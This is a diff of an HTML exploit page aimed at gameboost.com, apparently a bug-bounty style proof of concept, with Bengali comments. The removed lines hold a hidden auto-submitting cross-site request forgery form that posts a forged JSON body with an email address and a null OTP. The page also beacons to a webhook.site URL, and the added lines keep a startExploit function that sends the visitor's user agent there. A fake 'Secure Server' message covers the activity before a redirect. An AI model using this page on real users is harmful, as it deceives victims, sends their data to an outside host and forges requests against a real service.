@@ -3,35 +3,28 @@
 <head>
     <title>Redirecting...</title>
 </head>
-<body onload="document.getElementById('exploitForm').submit()">
-    <div style="text-align: center; margin-top: 50px;">
-        <h2>Connecting to Secure Server...</h2>
-        <p>Please do not close this window.</p>
+<body onload="startExploit()">
+    <div style="text-align: center; margin-top: 50px; font-family: Arial;">
+        <h2>Connecting to GameBoost Secure Server...</h2>
+        <p>Please wait a moment.</p>
     </div>
 
-    <!-- Webhook এ ডাটা পাঠানোর জন্য সাইলেন্ট ইমেজ লোড -->
-    <img src="https://webhook.site/028048b6-9240-4e61-bff6-e35594c32a79" style="display:none;">
-
-    <!-- অরিজিনাল সাইটে রিকোয়েস্ট পাঠানো -->
-    <form id="exploitForm" action="https://gameboost.com" method="POST" enctype="text/plain">
-        <input type="hidden" name='{"email":"ridoyp99@gmail.com","otp":null, "ignore":"' value='"}'>
-    </form>
-
     <script>
-        // ১. Webhook এ ডাটা পাঠানো
-        fetch("https://webhook.site", {
-            method: 'POST',
-            mode: 'no-cors',
-            body: JSON.stringify({
-                info: "Victim clicked GitHub link",
-                ua: navigator.userAgent
-            })
-        });
+        function startExploit() {
+            const webhookUrl = "https://webhook.site";
 
-        // ২. ২ সেকেন্ড পর অটো সাবমিট (যদি বডি লোড না হয়)
-        setTimeout(function(){
-            document.getElementById('exploitForm').submit();
-        }, 2000);
+            // ১. Webhook এ ডাটা পাঠানো (এটা অলরেডি আপনার কাজ করছে)
+            navigator.sendBeacon(webhookUrl, JSON.stringify({
+                event: "Victim Clicked POC",
+                ua: navigator.userAgent
+            }));
+
+            // ২. সরাসরি GET রিকোয়েস্ট দিয়ে রিডাইরেক্ট করা (যাতে 404 না আসে)
+            setTimeout(function() {
+                // সরাসরি লগইন পেজে পাঠান, এটা 404 দিবে না
+                window.location.href = "https://gameboost.com"; 
+            }, 1000);
+        }
     </script>
 </body>
 </html>
